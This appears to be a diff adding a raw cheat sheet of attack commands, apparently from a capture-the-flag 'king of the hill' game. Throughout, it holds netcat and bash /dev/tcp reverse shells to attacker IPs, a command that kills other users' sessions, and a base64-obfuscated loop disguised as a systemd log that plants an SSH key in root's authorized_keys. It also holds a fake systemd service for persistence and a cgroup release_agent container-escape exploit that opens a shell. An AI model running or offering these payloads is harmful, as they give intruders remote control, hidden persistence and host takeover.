@@ -1,0 +1,54 @@
+mkfifo /tmp/p; nc 10.4.19.124 1337 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p
+mkfifo /tmp/p; nc 10.10.14.61 13337 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p
+mkfifo /tmp/f; nc 10.4.19.124 1338 0</tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
+mkfifo /var/tmp/f; nc 10.4.19.124 1339 0</var/tmp/f | /bin/sh > /var/tmp/f 2>&1; rm /var/tmp/f
+
+bash -i >& /dev/tcp/10.10.14.61/13337 0>&1
+bash -c "bash -i >& /dev/tcp/10.10.14.61/13337 0>&1 &"
+nohup bash -c "bash -i >& /dev/tcp/10.10.14.61/13338 0>&1"
+
+python3 -c 'import subprocess; subprocess.Popen(["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.14.61/13337 0>&1"])'
+
+10.4.19.124
+10.10.42.219
+
+bash -c 'who -a | tr -s " " | grep -v 130 | grep 10.4 | cut -d ' ' -f 7 | while read pid; do kill -9 $pid; done'
+
+dd if=/dev/urandom of=/dev/pts/1
+
+echo d2hpbGUgdHJ1ZTsgZG8KICAgIG1rZGlyIC9yb290Ly5zc2gKICAgIGVjaG8gInNzaC1yc2EgQUFBQUIzTnphQzF5YzJFQUFBQURBUUFCQUFBQmdRQzA3bVVyWllPcVVldHp4RENKb3h3MXB5eDR5MnUyTytOSFlzZU5WYjZER0d1YjM5RkdydFFVayt1Y3hTN1pQSTdyZ01UeXIxZlJkY1RyQ3Fqc04vdWhld2ptalFDcXFjQVl0ZGJHRFU0RFdOVW5NWWdHUGJxUkpCeEdsU0xhUXNlYy9wQld1MDd0VEQ1RXBCdkZCTzBaU3dJSFpkM1RzejJoNlpKR2pRRXErVUlFZW5WYlg2SXZ0K2RYMktzSW1wWThhQXpXajR3elNHQ0ZJZW1NaEpJd0tHNzlOTTN6KytzVlJveDVqaHpleG93Z2RKVjBsWUswcGcwNmQvZ3E4T1R2QUdrRWtsTmROUmVyUkJlWXI3eWxHc1lqd21LZDlNSkRnN0JldU1GWGxxTWlBSFlZeWx5TkxQOVBEYnluMzAxRUZuQUR1WmN3bWVCRnF5QmNVbHVmRy9kdkJOSzBlOWRaOU15YTFTN0dKZzBEOVdvcmJ2RFdIOUpKaUtjU2kvZC8rTDA1MHVlQUtLcXE0UmxxVm1Ld3hYdEVpOFBVWGtMdTBOMndpR0tGRnluczM2eWp1R0UzMjZLZUxhWWRUdXIrZmxhbXh5UGpXNTcwRjNaK2xOTmRYZ092MU9FcE5Da3NPWklGbFg3aFNtemlPOUY4YllIdVM1SXJVSTFLdTJjPSBudWxsQG51bGwiID4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMKICAgIGNobW9kIDYwMCAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5cwogICAgZWNobyBTYW10aGVoYWNrZXIgPiAvcm9vdC9raW5nLnR4dApkb25lCg==  | base64 -d > /tmp/systemd.log; chmod +x /tmp/systemd.log; nohup /tmp/systemd.log &
+
+while true; do
+    mkdir /root/.ssh
+    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC07mUrZYOqUetzxDCJoxw1pyx4y2u2O+NHYseNVb6DGGub39FGrtQUk+ucxS7ZPI7rgMTyr1fRdcTrCqjsN/uhewjmjQCqqcAYtdbGDU4DWNUnMYgGPbqRJBxGlSLaQsec/pBWu07tTD5EpBvFBO0ZSwIHZd3Tsz2h6ZJGjQEq+UIEenVbX6Ivt+dX2KsImpY8aAzWj4wzSGCFIemMhJIwKG79NM3z++sVRox5jhzexowgdJV0lYK0pg06d/gq8OTvAGkEklNdNRerRBeYr7ylGsYjwmKd9MJDg7BeuMFXlqMiAHYYylyNLP9PDbyn301EFnADuZcwmeBFqyBcUlufG/dvBNK0e9dZ9Mya1S7GJg0D9WorbvDWH9JJiKcSi/d/+L050ueAKKqq4RlqVmKwxXtEi8PUXkLu0N2wiGKFFyns36yjuGE326KeLaYdTur+flamxyPjW570F3Z+lNNdXgOv1OEpNCksOZIFlX7hSmziO9F8bYHuS5IrUI1Ku2c= null@null" > /root/.ssh/authorized_keys
+    chmod 600 /root/.ssh/authorized_keys
+    echo Samthehacker > /root/king.txt
+done
+
+
+[Unit]
+Description=Systemd
+
+[Service]
+Type=forking
+ExecStart=/var/tmp/systemd
+
+[Install]
+WantedBy=multi-user.target
+
+echo W1VuaXRdCkRlc2NyaXB0aW9uPVN5c3RlbWQKCltTZXJ2aWNlXQpUeXBlPWZvcmtpbmcKRXhlY1N0YXJ0PS92YXIvdG1wL3N5c3RlbWQKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldAo= > /etc/systemd/system/syss.service; systemctl
+
+while true; do if [ $(ls -1A | wc -l) -gt 0 ]; then ls -lA; sleep 1; fi; done
+
+kill -9 696
+
+mkdir /exploit/cgrp && mount -t cgroup -o rdma cgroup /exploit/cgrp && mkdir /exploit/cgrp/x
+echo 1 > /exploit/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /exploit/cgrp/release_agent
+echo '#!/bin/sh' > /cmd
+echo 'mkfifo /tmp/p; nc 10.10.14.61 1338 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p' >> /cmd
+#echo 'cat /root/root.txt | nc 10.10.14.61 4444' >> /cmd
+echo "ps aux > $host_path/output" >> /cmd
+chmod a+x /cmd
+sh -c "echo \$\$ > /exploit/cgrp/x/cgroup.procs"
